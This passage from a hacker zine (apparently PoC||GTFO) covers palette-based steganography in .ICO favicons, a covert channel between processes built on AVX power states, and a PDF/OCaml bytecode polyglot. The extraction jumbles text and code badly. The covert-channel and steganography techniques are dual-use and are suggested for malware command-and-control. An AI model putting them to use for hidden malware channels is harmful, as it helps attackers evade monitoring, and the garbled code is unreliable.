nent; something that would keep things biased and
powered. But again and again I came up with only
components made of unobtainium. Long hours I
sat until the simplicity of the whole problem came
clear – it was a supply with two purposes and the
rest was just discrete MOSFETs of the P-type. The
supply needs to do two things at once; it needs to
couple current back and forth across the heaters and
at the same time it needs to bias those wires down
until the electrons leap free. A transformer can do
this when coupled with source for changing currents.
The source would be very easy, I had a controller
nearby and could turn on and off a MOSFET, while
a transformer could take those pulses of current and
wash the electricity back and forth to heat the wire.
A second winding on the transformer could even be
attached to diodes and they can push together to
bias the heaters down far enough.
But lo, the ugly head of the unobtainium com-
ponent reared again! For though transformers are
common enough, ones with the ratio set of one-to-
one and one-to-ten together aren’t. The suppliers
were barren, once more having only the holes and
echos where the transformers may have been.
Thank you.
454619:08
Steganography in .ICO Files
by Rodger Allen
For the delight and amusement of
the Reverend Pastor Manul Laphraoig and his flock,
These days, with a megapixel camera in all our
phones, we are used to full colour, 24-bit images.
The days of 256 colour images may seem to be some-
thing that only our older neighbours might remem-
ber. But these low-res images are still with us and
so ubiquitous that they go unnoticed.
Minimize all the windows on your desktop and
you’ll likely see a dozen or more of them. Check the
tabs in your browser and you’ll see many more. Yep,
a great deal of those icons and favicons are actually
low resolution bitmaps.
And they’re a great place to hide data!
MSDN page on the RGBQUAD struct states that the
fourth byte is “reserved and must be zero.” 52
The depth of colour in a palettized image is then
still the same as a full 24-bit colour image - each
pixel is still a full 24-bit colour. It’s just that the
palettized image is likely to contain fewer overall
colours than the 24-bit-per-pixel image. Indeed,
even the so-called monochrome 1-bit image isn’t re-
stricted to just black and white; the two colours can
both be full 24-bit colours.
The choice as to whether to use a palettized im-
age or just have 24-bit pixels mostly comes down to
file size. For a small image, such as an icon (and we’ll
come back to these soon) you might find it better
to use 24-bit pixels instead of allocating 1k for the
palette. For example, a 16×16 image might use just
20-odd different colours. If it used a palette, then
the file size would be (roughly) 1.25k (1024 bytes
for the palette and then 256 bytes (16×16) for the
pixels), with roughly 900 bytes of palette unrefer-
enced and unused. Using 24-bit pixels would yield a
file size of approx .75k (0 bytes for the palette and
768 bytes (16×16×3) for the pixels). The figures
for a 32×32 pixel image would be 2,048 bytes for
the palettized image and 3,072 bytes for the 24-bit
version.
BMP Palettes
First, let’s discuss how Palettized BMPs work. The
basic structure of a bitmap file is a bit like so.
// 14 Byte F i l e H e a d e r .
2 typedef struct tagBITMAPFILEHEADER {
WORD bfType ;
4
DWORD b f S i z e ;
WORD b f R e s e r v e d 1 ;
6
WORD b f R e s e r v e d 2 ;
DWORD b f O f f B i t s ;
8 } BITMAPFILEHEADER;
10 // 5 d i f f e r e n t s i z e s , 20 t o 124 b y t e s .
struct DIBHeader ;
12
// O p t i o n a l , 8 t o 1024 b y t e s .
14 struct P a l e t t e ;
Palette Histograms
16 //Rows a r e n u l l −padded , d i v i s i b l e by f o u r .
RGBQUAD p i x e l s [ ] ;
The key element of this steganographic technique is
to take a histogram of the palette colours that are
used in the pixels. It is often the case that not every
colour defined in the palette is actually used by the
pixels. The histogram makes a count of the number
of times each colour is used. We are interested in
the colours that have a count of zero, since we can
then overwrite those colours (bytes) in the palette
array, and it won’t affect the display of the image.
Bitmap images that don’t use a palette define the
colour independently for each pixel. Each pixel uses
three bytes (24 bits) to define the Red, Green and
Blue (RGB) channels. The pixels in a palettized im-
age reference the Palette to define the colour for each
pixel. 256-colour bitmaps use 8-bit pixels, 16-colour
bitmaps use 4-bit pixels, and 2-colour bitmaps use
a single bit for each pixel.
The palette structure uses four bytes to define
each RGB, with the fourth byte being reserved. The
52 MSDN
To extract the data utilises the same process -
take a histogram of the pixels per palette colour,
and read those bytes out.
tagRGBQUAD Structure
47Detectability
This technique has three important advantages
over the LSB (Least Significant Bit) method:
First, there is no need to have a reference im-
age. The LSB method makes comparison between
the original image and the injected image to deter-
mine which bits have been altered. With this tech-
nique, the original pixel array is the key to which
bytes are to be read from the palette.
Second, and depending on the image size, there is
the potential to store quite a bit more data into the
image. The LSB method generally only uses one bit
per colour channel, so even with 24-bit images it can
only store three bits per pixel. This method though
has an upper-limit on the amount of data that can
be stored per image - an 8-bit palettized image that
only uses two colours leaves 254 free colours, there-
fore leaving 762 bytes to inject into. The size of the
image itself doesn’t change this.
Finally, there is an element of deniability in the
histogram method. Steganography is framed as a
game between two prisoners, Alice and Bob, who
wish to privately communicate in the presence of
a warden, Mallory, who can read all of their mes-
sages. Even if Mallory does notice that the palette is
weird, Alice or Bob could quite plausibly say, “Hey,
that’s just the palette that the image creation soft-
ware made.” Of course, Alice and Bob could only
use their image once without drawing attention to
them.
You might remember from earlier that each
palette entry uses four bytes. I quite deliberately
only use the three RGB bytes to inject and leave
the reserved bytes alone, mostly on the grounds of
detectability.
Despite the claim to deniability, there are some ob-
vious markers of the injection. For starters, take a
look at the examples of a palette from an image pro-
cessed by MS Paint, which is for the most part the
old web-safe palette, or the palette generated by Im-
age Magick’s convert utility, 53 which is front-loaded
with the actual colours in the image, and then the
rest is solid black (0x000000). Yet another palette
that was converted from 24-bit to 256 colours by Im-
age Magick does display quite a spread of colours:
Image Magick Short Palette
Microsoft Web-Safe Palette
Image Magick Full Palette
53 man
1 convert
48Icons
Then compare these to the palette from an in-
jected image. It is obvious that the colours have
been all jumbled up.
Image Before and After Injection
But who uses those palettized bitmaps any more?
The camera in your phone, heck, even the display
on your phone, is capable of taking and displaying
images with a bewildering depth of colour. And
nowadays, bandwidth is cheap and fast, and image
compression algorithms are good enough, that there
is little reason to lower the quality of the images.
There are two places, however, where these im-
ages are, if not ubiquitous, at least quite widespread.
Take a moment, and minimize all the windows on
your desktop. Most of those icons will be using
bitmaps. Now open a browser and navigate to some
random page. That little icon in the browser loca-
tion bar or in the tab is also most likely a bitmap,
and is known as a favicon. Not every website has
them, but almost every browser will request them.
The Icon file format is basically a little directory
of multiple images. The format for an Icon header
follows this general schema:
1 typedef struct {
WORD i d R e s e r v e d ; // Always z e r o .
3
WORD idType ;
// Often 0 x0100 .
WORD idCount ;
// Count o f d i r e e n t r i e s .
5 } ICONHEADER;
It is followed by one or more 16-byte directory
entries.
1 typedef struct {
BYTE bWidth ;
3
BYTE bHeight ;
BYTE bColorCount ;
5
BYTE bReserved ;
WORD wPlanes ;
7
WORD wBitCount ;
DWORD dwBytesInRes ;
9
DWORD d w O f f s e t ;
} ICONDIRENTRY
The rest of the file is nominally contiguous blocks
of images. The standards suggest that there are
only two types of valid images: BMP and PNG.
The BMP image blocks are basically the same as
for BMP files, but don’t use the first 14 bytes of
the FileHeader. That is, they use the DIB Header,
optionally the Palette, and of course the Pixels.
The DIB pixels in an icon have one other com-
plication. The pixel array is in fact two separate
arrays. The first is the is the actual coloured pixel
49array. The second is literally an array of bits that
act as a mask that is used to determine the trans-
parency of the icon.
One major difference between the Icon format
and the DIB format (the actual image format con-
tained in the BMP), is that the Icon header infor-
mation is little-endian, and the DIB format is big-
endian. So the resultant file is a mix of both big and
little endians.
Consider that idCount field. An icon file can
contain up to 65,536 image resources. That’s up to
48Mb worth of injectable palette space!
Injected Icon and its Palettes
Example of an Icon header
2 00 00
01 00
4 02 00
6
8
10
12
14
10
10
00
00
01
08
68
26
00
00
05 00 00
00 00 00
−− i c o h e a d e r
idReserved
idType
idCount
−− r e s o u r c e h e a d e r 1
bWidth
bHeight
bColorCount ( 0 i f >=8bpp )
bReserved ( must be 0 )
wPlanes
wBitCount
dwBytesInRes
dwOffset
−− r e s o u r c e h e a d e r 2
16
etc
18
20 e t c
−− r e s o u r c e data 1
S t a r t s a t 0 x00000026 ,
c o n t a i n i n g 0 x0568 b y t e s .
22
24
26
Consists of :
∗ DIBHeader
∗ P a l e t t e ( maybe )
∗ Pixels
∗ T ra n s pa r e nc y mask
28
−− r e s o u r c e data 2
30 e t c
50Uses in the Past and Future
You can also, of course, just tack on the extra data
at the end of the file, and it should be ignored by
the image viewer.
The default image viewers (eog, shotwell) on the
version of Linux I am currently using doesn’t like the
padding before the pixels, rendering the image with
those padded bytes; maybe one of our memory-bug
hunting friends could find some delight here. Gimp
is okay though. Windows seems to behave correctly
and ignores the extra bytes.
Taking a look at the favicons used by the top thou-
sand sites from the Alexa list. Just under seven hun-
dred of the sites responded with an image file. Of
these, 560 were icon resource files, that is, the type
of icon files I’ve described above. The others were
in general just PNGs or other image types simply
renamed with the .ico extension.
Of these icon resources, at least 1-in-7 contained
an 8-bit BMP image, suitable for palette injection.
Around three quarters of these files contained only
Where’s the code?
one or two images, but there were four favicons that
contained ten or more bitmaps.
The POC code is a tool called Stegpal, written in
Given how widespread these favicons are and
Haskell. If the source is not yet available from Hack-
their variety, and the fact that they are effectively
age, you’ll find it attached to this PDF and as the
ignored by most web security monitoring systems,
Favicon for the most popular PoCkGTFO mirror. 55
they would an excellent mechanism for at least part
of a C2 (Command and Control) channel for mal-
Creating icons
ware. Indeed, there is some history with the Vaw-
trak malware using LSB steganography to commu-
I used Image Magick to create sample icons. I wasn’t
nicate updates from their C2 servers. 54 Other mal-
too worried about the transparency bits, as they
ware rootkits have just renamed their malware to
don’t change anything about the palette.
favicon.ico, but are in reality just raw (or obfus-
Start with a an image that is going to bear be-
cated) PHP code or the like.
ing reduced down to a small size. The number of
As for prior art, I haven’t been able to discover
colours doesn’t matter too much as this process will
any other previous uses of this technique of repur-
reduce that anyway. It’s best if the original image
posing the unused bytes in an image palette. If any
has equal dimensions for width and height.
brethren know of similar techniques, I’d love to hear
Create a bunch of smaller scaled images from the
about it.
original. Favicons are usually 16x16 (ish), but you
Bitmaps aren’t the only image type that use a
can create them any size you want.
palette. PNGs, for instance, have a PLTE chunk
Then feed all of the smaller BMPs into one ico.
that describes the colours in the image. But the
PNG format removes the dead colours and the
# Creating icons
PLTE chunk only contains a list of the actual used
colours, thereby reducing the size. The PNG stan- 2
c o n v e r t s o u r c e . bmp − s c a l e 64 x64
\
dard does however allow the PLTE chunk to contain 4
−t y p e P a l e t t e −depth 8 −c om pr e ss none \
more colours than are actually used. This histogram
temp−64x64 . bmp
\
technique would then reduce to adding extra bytes 6 c o n v e r t s o u r c e . bmp − s c a l e 32 x32
−t y p e P a l e t t e −depth 8 −c om pr e ss none \
to the image file, a method I was trying to avoid.
8
temp−32x32 . bmp
On the subject of adding extra bytes, notice that
c o n v e r t s o u r c e . bmp − s c a l e 16 x16
\
both BMPs and Icons are what I call indexed file for- 10
−t y p e P a l e t t e −depth 8 −c om pr e ss none \
temp−16x16 . bmp
mats; that is, the header contains information about
e r t temp−64x64 . bmp temp−32x32 . bmp
\
the offset (where the image data starts) and size 12 c o n v temp−16x16
. bmp f a v i c o n . i c o
(how big the image data is). This makes it possible
to introduce arbitrary data into the files and then
manipulate the offsets to skip over the padded data.
54 unzip
55 unzip
pocorgtfo19.pdf avgvawtrak.pdf
pocorgtfo19.pdf stegpal-0.2.8.0.tar.gz; wget https://www.alchemist.org/favicon.ico
515219:09
The Pages of PoC||GTFO
by Dr. evm and the MMX Show
To the tune of “The Cover of the Rolling Stone”
by Dr. Hook and the Medicine Show
(with apologies to, and warm regards for, the late great Shel Silverstein)
Well we’re big time hackers
we know all the threat actors
and we speak at every security show
We’ll pentest your net
without breaking a sweat
at a hundred thousand dollars a go
We hunt all of the bounties
for the Feds and the Mounties
but the prize we’ve never owned
is the congregation’s praises
when you’re published in the pages
of P-o-C or G-T-F-O!
(PoC. . . ) Wanna see my article in the pages
(GTFO. . . ) Wanna execute in its payload stages!
(GTFO. . . ) Wanna see my zero days
In P-o-C or G-T-F-O!
We got a staff artist name o’ Cyber Stardust
who draws logos for all of our vulns
We got a top notch research department
who straightens out our zeroes and ones
Now the name of our game is acquiring fame
but the fame we’ve never known
is the fame and the glory
when you tell your story
in P-o-C or G-T-F-O!
(PoC. . . ) Wanna read my words in the pages
(GTFO. . . ) Wanna execute in its payload stages!
(GTFO. . . ) Wanna see my zero days
In P-o-C or G-T-F-O!
We invite all the smarties
to our BlackHat parties
that get pretty out of hand
We’ve got a grey haired CEO
who used to work at CyberCommand
We got all the Twitter hype money can buy
HashtagDeepLearningBlockchainOnaDrone
But technically it’s rubbish
So we can’t get published
In P-o-C or G-T-F-O!
(PoC. . . ) Wanna see my name on the pages
(GTFO. . . ) Wanna execute in its payload stages!
(GTFO. . . ) Wanna see my zero days
In P-o-C or G-T-F-O!
535419:10
Vector Multiplication as an IPC Primitive
by Lorenzo Benelli
Since time immemorial computer scientists have
pondered what could be the best way for two pro-
cesses to interact with each other. Is it shared mem-
ory? Is it message queues? Is it sockets? Wait no
more, dear neighbor, because in this modest arti-
cle I’m going to present a novel and more promising
way. We will see that processes can communicate
with one another by using little more than vector
instructions!
Overview of power management
Starting with the Sandy Bridge architecture, Intel’s
ISA included a new set of instructions called AVX,
to operate on larger, 256-bit sized, registers. More
recent architectures further extended this function-
ality with another set, AVX2.
As keeping these wide registers turned on all the
time wasn’t power-efficient, Skylake and later archi-
tectures kept them inactive during the normal scalar
code execution. The CPU would start powering on
these wider, vector data paths only when the first
SIMD instruction got executed.
This process takes time, and while the vector ex-
ecution units are being turned on, the vector code
gets dispatched to μops that make use of narrower
registers and, consequently, execute at roughly half
the speed. Also, after the core encounters a vector
instruction, the processor will keep the registers ac-
tive for a while (on the order of milliseconds) after
the last SIMD instruction is scheduled to run.
As the core that runs this sort of vector code
will require more power to keep the registers active,
the Package Control Unit (PCU)—an on-chip micro-
controller that manages frequencies and voltages of
the processor—will increase that core’s voltage with
a mechanism that Intel calls “granting a power li-
cense.”
Within the bureaucratic apparatus that is the
processor, a core is granted a different power license
depending on the kind of instructions it is executing.
For all AVX instructions, and for some simple AVX2
instructions like loads and adds, the core gets to run
on the modest LVL0_TURBO_LICENSE. For complex
AVX2 instructions it gets the regular LVL1_TURBO_-
LICENSE, while the cores lucky enough to run AVX-
512 win a premium LVL2_TURBO_LICENSE.
Also, the core’s frequency gets capped by the
PCU to a lower value, which is referred as the AVX2
Turbo frequency. For commercial desktop and lap-
tops CPUs, this applies to not just the core running
vector code but to all cores in the same processor.
This led me to wonder: what is happening to
the wide SIMD units of the other cores during that
time? Are they all powered-on all together? If so,
could this be used to make our processes have a lit-
tle chat without bothering the OS with expensive
syscalls?
55Latency is key
With this rough idea of the inner workings of the In-
tel’s CPU power management, I wrote a tiny snippet
of code that launches two processes with the ability
to communicate without any nasty interaction with
the OS.
One parameter offered by the code is TIME_-
SCALE, which you can set at your convenience in
case your plotting utility doesn’t implement hori-
zontal zooming, or if you wish to pin the processes
to far away cores.
As we’d like to eventually store some measure-
ments, BUFSZ provides a way to delay the unavoid-
able write() call, because the longer we can prolong
our abstinence from kernel communication, the bet-
ter.
For each bit to be transmitted, the sender pro-
cess either executes a very long succession of AVX2
multiplications, or enters a busy loop, doing noth-
ing for long enough that the PCU decides to revoke
its power license, powering off the vector execution
units.
Another process, the receiver, runs a short burst
of vector instructions, then also sleeps for enough
time that the PCU decides to revoke its power li-
cense. The receiver process is also keeping track of
its execution speed via the rdtsc instruction, peri-
odically dumping it to stdout.
1 #include <i m m i n t r i n . h>
#include <s t d i o . h>
3
#define TIME_SCALE 1 . 0
5 #define BUFSZ 0 x400
7 void b s l e e p ( u i n t 6 4 _ t ) ;
void send ( u i n t 8 _ t ) ;
9 void r e c v ( void ) ;
11 i n t main ( ) {
pid_t p i d ;
13
i f ( ( p i d = f o r k ( ) ) == 0 ) {
15
recv () ;
} e l s e i f ( p i d != −1) {
17
send ( ’P ’ ) ;
send ( ’ o ’ ) ;
19
send ( ’C ’ ) ;
b s l e e p ( 0 x400000000 ) ;
21
k i l l ( pid , 9 ) ;
}
23
return 0 ;
}
25
void b s l e e p ( u i n t 6 4 _ t c l k ) {
27
u i n t 6 4 _ t beg , end ;
u i n t 3 2 _ t h i0 , l o 0 , hi1 , l o 1 ;
29
asm v o l a t i l e (
" c p u i d \n\ t "
31
" r d t s c \n\ t "
"mov %%edx , %0\n\ t "
33
"mov %%eax , %1\n\ t "
: "=r " ( h i 0 ) , "=r " ( l o 0 ) : :
35
"%r a x " , "%rbx " , "%r c x " , "%rdx "
);
37
end = beg = ( ( ( u i n t 6 4 _ t ) h i 0 << 3 2 ) | l o 0 ) ;
while ( end − beg < c l k ) {
39
asm v o l a t i l e (
" c p u i d \n\ t "
41
" r d t s c \n\ t "
"mov %%edx , %0\n\ t "
43
"mov %%eax , %1\n\ t "
" pause \n\ t "
45
: "=r " ( h i 1 ) , "=r " ( l o 1 ) : :
"%r a x " , "%rbx " , "%r c x " , "%rdx "
47
);
end = ( ( ( u i n t 6 4 _ t ) h i 1 << 3 2 ) | l o 1 ) ;
49
}
}
2
4
6
8
10
12
14
16
18
20
22
24
56
void send ( u i n t 8 _ t c ) {
f o r ( i n t i =0; i <8; i ++) {
u i n t 8 _ t b i t = ( c >> i & 1 ) ;
if ( bit ) {
f o r ( u i n t 6 4 _ t i =0; i <0x4000 ∗SCALE ; i ++){
asm v o l a t i l e (
" pushq $0x40000000 \ r \n"
" v b r o a d c a s t s s 0(%%r s p ) , %%ymm0\ r \n"
" v b r o a d c a s t s s 0(%%r s p ) , %%ymm1\ r \n"
"mov $10000 , %%e c x \ r \n"
" l o o p 1 : \ r \n"
" vmulps %%ymm0, %%ymm1, %%ymm1\ r \n"
" dec %%e c x \ r \n"
" j n z l o o p 1 \ r \n"
" popq %%r c x \ r \n"
:::
);
b s l e e p ( 0 x20000 ) ;
}
} else {
b s l e e p ( 0 x8db6db6d ∗ SCALE) ;
}
f p r i n t f ( s t d e r r , " t i c k %d\n" , b i t ) ;
}
}If the receiver process is running during a qui-
escent period of the sender process, meaning that
the vector registers are powered down, it will run
at about half the speed for at least 150K clock cy-
cles, which is roughly the warm-up period on Coffee
Lake. Otherwise, it will dash forth at full speed. Re-
peating this enough times, the receiver can gather
sufficient evidence to know what bit was being sent
to him by his neighboring process.
1 void r e c v ( void ) {
u i n t 6 4 _ t beg , end , i = 0 ;
3
u i n t 3 2 _ t hi0 , l o 0 , hi1 , l o 1 ;
s t a t i c u i n t 6 4 _ t time [ BUFSZ ] ;
5
s t a t i c char b u f [ 0 x10000 ] , ∗ i t = b u f ;
7
9
11
13
15
17
19
21
23
25
27
29
31
33
35
37
while ( 1 ) {
asm v o l a t i l e (
" c p u i d \n\ t "
" r d t s c \n\ t "
"mov %%edx , %0\n\ t "
"mov %%eax , %1\n\ t "
: "=r " ( h i 0 ) , "=r " ( l o 0 ) : :
"%r a x " , "%rbx " , "%r c x " , "%rdx "
);
asm v o l a t i l e (
" pushq $0x40000000 \ r \n"
" v b r o a d c a s t s s 0(%%r s p ) , %%ymm0\ r \n"
" v b r o a d c a s t s s 0(%%r s p ) , %%ymm1\ r \n"
"mov $10000 , %%e c x \ r \n"
" l o o p : \ r \n"
" vmulps %%ymm0, %%ymm1, %%ymm1\ r \n"
" dec %%e c x \ r \n"
" j n z l o o p \ r \n"
" popq %%r c x \ r \n"
:::
);
asm v o l a t i l e (
" c p u i d \n\ t "
" r d t s c \n\ t "
"mov %%edx , %0\n\ t "
"mov %%eax , %1\n\ t "
: "=r " ( h i 1 ) , "=r " ( l o 1 ) : :
"%r a x " , "%rbx " , "%r c x " , "%rdx "
);
beg = ( ( ( u i n t 6 4 _ t ) h i 0 << 3 2 ) | l o 0 ) ;
end = ( ( ( u i n t 6 4 _ t ) h i 1 << 3 2 ) | l o 1 ) ;
time [ i ++] = end − beg ;
On page 58 you can see the data plots taken from
some Kaby, Coffee Lake, and Sky Lake systems, and
a reference of the inverted ASCII signal, where the
most significant bits are sent last.
The End
What is actually happening inside the processor is
not completely clear to me. Perhaps the vector units
are not kept active all the time while executing AVX
code. Since the PCU on mixed scalar/vector work-
loads has already lowered the frequency of all the
cores, it has more room to adjust their voltages
quickly, and it is consequently able to power the
wide paths faster, ultimately with similar effects.
Let me know if you manage to figure this out, neigh-
bors!
Finally, a few words about why I think this is a
better way for processes to communicate.
39
b s l e e p ( 0 x1000000 ) ;
41
First, the processes get to avoid those pesky
syscall instructions which make the software we
write daily completely non-portable.
i f ( i == BUFSZ) {
i = 0;
f o r ( u i n t 6 4 _ t i = 0 ; i < 1 0 2 4 ; i ++) {
i t += s p r i n t f ( i t , "%l u \n" , time [ i ] ) ;
}
p r i n t f ( "%s " , b u f ) ;
i t = buf ;
}
43
45
47
49
Second, although not as fast as other IPC imple-
mentations, this one makes communication a CPU-
bound problem instead of an I/O-bound one, which,
as everybody knows, is a much nicer problem to
have.
}
51 }
Third, two processes in completely separate VMs
can now communicate, without the extra long and
boring configuration jobs that sysadmins have to do
in order to get the infrastructure to work.
Employees must
wash hands before
returning to libc
This is why, neighbors, you should promptly ex-
periment with this method, as well as try to find
further novel and nifty ways to use our processors.
Maybe we will one day be able to multiply two vec-
tors with only syscall instructions!
57Coffee Lake Warmup Time Sky Lake Warmup Time
Kaby Lake Warmup Time Reference Message (POC)
585919:11
Camelus Documentum: A PDF with Two Humps
by Gabriel ‘Drup’ Radanne
Science is in crisis. The nonsensical editorial
model is attacked, 56 the validity of peer review sys-
tems is questioned, and, our topic today, the repro-
ducibility of scientific research is put in doubt. As
computer science researchers, we gain reproducibil-
ity mostly by providing an implementation of the
scientific concept that can then be executed: a Proof
of Concept, if you will. As a programming language
enthusiast, my weapon of choice is OCaml.
To make my research reproducible, I would like
to include my PoC directly into my paper, so that
reviewers and readers can read and execute my re-
search directly. To achieve this, I’m going to show
you how to embed a portable OCaml bytecode exe-
cutable directly into a PDF article.
Do virtualized camels
lambda-expressions?
dream
The index is a list of pairs composed of a four let-
ter name and a length in bytes. The order of the sec-
tions is not important. The virtual machine knows
about a fixed set of sections: CODE, DATA and PRIM
(which contains the list of the required C primitives)
are mandatory. In addition, it can contain other sec-
tions such as DLLS (required libraries), DLPT (where
to find libraries), DBUG (debug information), CRCS
(CRCs of contained modules), and SYMB (nobody
knows, it’s not documented, but it’s probably about
symbols).
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
I g n o r e d Header
|
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
Section 1
|
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
Section 2
|
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
.
.
.
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
Section N
|
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
| Description of Section 1 |
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
| Description of Section 2 |
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
.
.
.
+−−−−−−−−−−−−−−−−−−−−−−−−−−+
| Description of Section N |
+−−−−−−−−−−−−+−−−−−−−−−−−−−+
| Nb o f S e c t s | MagicNumber |
+−−−−−−−−−−−−+−−−−−−−−−−−−−+
one 32 b i t s
twelve 8 b i t s
integer
chars
of
OCaml is the hipster of programming languages.
It’s a statically typed programming language with
support for both functional and object-oriented
paradigms that was created in 1996, long before
it was cool. Its main selling point is its sensible
and usable design, which is achieved by reaching a
compromise between the practicality of Haskell, the
safety of C and the speed of Lisp. While OCaml
is genuinely an amazing language, it also possess a
slightly unusual feature: it can be compiled to either
native executable for speed, or to bytecode, which
can be executed on a virtual machine. Bytecode is
portable, 57 rather lightweight, and reasonably fast.
So, what does OCaml bytecode look like? It’s
actually a fairly simple file format: a bytecode file is
divided into sections. Just like ZIP files, the content
starts from the end. The last line of the file should
be composed of a magic number that identifies the
version of the bytecode, the number of sections, and
an index.
56 Except
^
|
|
|
| Sections
|
|
|
v
^
|
|
|
| Index :
| n ∗64 b i t s
|
|
v
Description of a Section
+−−−−−−−−−−−−+−−−−−−−−−−−+
|
Name
|
Length
|
+−−−−−−−−−−−−+−−−−−−−−−−−+
<−−−−−−−−−−> <−−−−−−−−−>
four 8 bits
one 32 b i t s
chars
integer
the PoCkGTFO model, which is obviously perfect.
include but are not limited to: Portability to potato-based architectures, integer sizes, and native system libraries.
57 Caveats
60%PDF-1.4
%
1 0 obj
<<
This PDF is an OCaml bytecode )
/Title(
Metadata
/Author( Gabriel
Radanne )
/Creator( radanne@informatik.uni-freiburg.de )
/Subject( This
PDF is an OCaml bytecode. The OCaml bytecode is a
program which takes and arbitrary pdf, a bytecode, and merges
them in a file that is both a valid PDF and a valid bytecode.
This Poster contains the code of the PDF. )
/Keywords(OCaml, PDF, Bytecode, Polyglot files)
/Producer(Pdflatex, Mutool, ocamlc and Emacs)>>
endobj
2 0 obj
<</Type/Filespec/F(bytepdf.bc)/EF<</F 23 0 R>>>>
endobj
3 0 obj
<</Length 13139/Subtype/Type1C/Filter/ASCIIHexDecode>>
stream
010004020001010106434d5231300001010131f81b01f81c02f81d038bfb8ef9c1f982051d000f42401d1ed9b0ee0e8b0c038b0c04ad1c192012f7fd11f7960ff76110000301016e7382436f707972696768742
028632920313939372c203230303920416d65726963616e204d617468656d61746963616c20536f636965747920283c687474703a2f2f7777772e616d732e6f72673e292c207769746820526573657276656420
466f6e74204e616d6520434d5231302e434d523130436f6d7075746572204d6f6465726e00000033416e6f5943704472467347747549764a77617862796364654f665067685269546b6c6d3437213a28295b0c2
c5d2d2e3031320b000022004f0050003a002400510025005300270054002800550056002a0057002b0058004200590043005a004400450046003000470031004800490033004a0035004c004d004e0015001800
02001b0009000a003c006d000d003e000e00...
endstream
endobj
...
14 0 obj
<</Length 9805>>
stream
q .1 0 0 .1 0 0 cm /R9 gs q BT 1 0 0 1 191.844 615.392 Tm 10 0 0 10 0 0 cm 0 g /R10 17.2154 Tf [(T)-.5998781(h)-.90052708(i)-.59846(s)-302.39503(P)-.199959(D)-.
5998781(F)-302.11(i)-.5998781(s)-302.39805(a)-.5998781(n)-301.90605(O)-1.8067302(C)-.5998781(a)-.601297(m)- 10068901(l)-301.61(b)25.1056(y)-.700567(t)-.09927071(e)-.
39991904(c)-.39991904(o)-26.591803(d)-.90194508(e)-.39991904]...
endstream
endobj
...
\000\000\000$u\000\000\000\000~\000=\000\000\000Out_of_memory\000\000\000)Sys_error\000\000\000'Failure\000\000\0000Invalid_a
rgument\000\000\000+End_of_file\000\000\0000Division_by_zero\000\000\000)Not_found...
24 0 obj
<</Type/Encoding/BaseEncoding/WinAnsiEncoding/Differences[11/ff/fi]>>
endobj
25 0 obj
<</Type/Annot/C[0 1 0]/Rect[175.446 472.783 182.419 481.195]/Border[0 0 0]/Dest[5 0 R/XYZ 133.768 325.363 null]/Subtype/Link>>
endobj
...
36 0 obj
<</Type/Annot/Subtype/FileAttachment/FS 2 0 R/Rect[0 0 0 0]/F 2>>
endobj
37 0 obj
<</Type/FontDescriptor/FontName/ZSEZIN+CMITT10/FontBBox[0 -228 593 617]/Flags 131105/Ascent 617/CapHeight 611/Descent -228/ItalicAngle 0/StemV 88/AvgWidth 525/MaxWidth
525/MissingWidth 525/XHeight 437/CharSet(/D/a/c/d/e/f/hyphen/i/l/n/numbersign/o/t/u)/FontFile3 35 0 R>>
endobj
...
xref
0 42
0000000000 65535 f
0000000015 00000 n
0000000420 00000 n
0000000499 00000 n
0000013726 00000 n
...
0005604545 00000 n
0005604833 00000 n
0005605296 00000 n
0005605640 00000 n
0005605926 00000 n
trailer
<<
/Size 42
/Info 1 0 R
/Root 7 0 R
/ID [ (l0.\214N\263\323\221\032Vd\310\023c<v) <FBC9DF422D8B8E6FE7DDBD0C0815AF47> ]
>>
startxref
Regular
Index
io
CODE000F8668 DLPT00000000 DLLS00000014 PRIM000023BC DATA000117B6 SYMB000009C1 CRCS000009C1 DBUG0043B769 00000008
Caml1999X011
endstream
endobj
UnixLabels1768838436Unix1751340325Uchar1937330979Sys1920226086String1685345064Stack1952797475Set1701990951Rresult1936020006Re
sult1851871782Random1702187301Queue1769099302Printf1769099304Printexc1919242282Pervasives1717850151Pdfwrite1717850152...
¦3⁄4\000\000\nG\000\000\001 \000\000\007B\000\000\006 \001\015ÐÐÐÐÐÐ@°@%ArrayA\000yÐ@°@'AstringA\001\012ò@AB°@,Astring_baseA\0
01\012ÒÐ@°@,Astring_charA\001\012ß@AC°@.Astring_escapeA\001\012ÝÐÐ@°@.Astring_stringA\001\012ñ@A°@+Astring_subA\001\012ä@BD°@
.Astring_unsafeA\001\012ÊÐÐÐÐ@°@"...
caml_abs_float\000caml_acos_float\000caml_add_debug_info\000caml_add_float\000caml_alloc_dummy\000caml_alloc_dummy_float\000c
aml_alloc_dummy_function\000caml_alloc_float_array\000caml_array_append\000caml_array_blit\000caml_array_concat\000caml_array
_get\000caml_array_get_addr\000caml_array_get_float\000...
dllunix\000dllbigarray\000
23 0 obj
<</Length 5541629/Type/EmbeddedFile>>
stream
#!ocamlrun
0a54000000df020000000000005700000001000f0010000000130000001c000000250000002e000000370000004000000049000000520000005b000000670
00000740000007d000000860000008f0000009800000063000000280000000100000000000000430000000a00000032000000210000003f00000000000000
280000000200000000000000430000000a00000032000000210000003f00000001000000280000000200000000000000430000000a0000003200000021000
0003f00000002000000280000000200000000000000430000000a00000032000000210000003f0000000300000028000000020000...
%%EOF
Not read by
PDF readers
CODE000F8668 DLPT00000000 DLLS00000014 PRIM000023BC DATA000117B6 SYMB000009C1 CRCS000009C1 DBUG0043B769 XPDF0000475A
00000009
Caml1999X011
61
Enhanced Index
with XPDF sectionThe current implementation of the virtual ma-
chine ignores the content of unknown sections, as
long as they use cryptic four-letter names. It also
ignores any data before the first section. For conve-
nience, the OCaml compiler adds a shebang at the
beginning of the file pointing to the bytecode run-
time, but it’s not required.
For the curious and the masochistic, non-official
documentation of the bytecode and its instructions—
it’s a neat stack machine—is available. 58 We will
content ourselves with this basic knowledge, which
is sufficient to use and abuse bytecode files in all
sorts of fun ways.
The Safir-Albertini hypothesis states
that abusing file formats influences
your thought and decisions
PoCkGTFO readers should be familiar with the con-
cept of PDF polyglots, from ZIP files to NES car-
tridges, including virtual machines and ELF exe-
cutables. 59 Still, let me give you a quick reminder
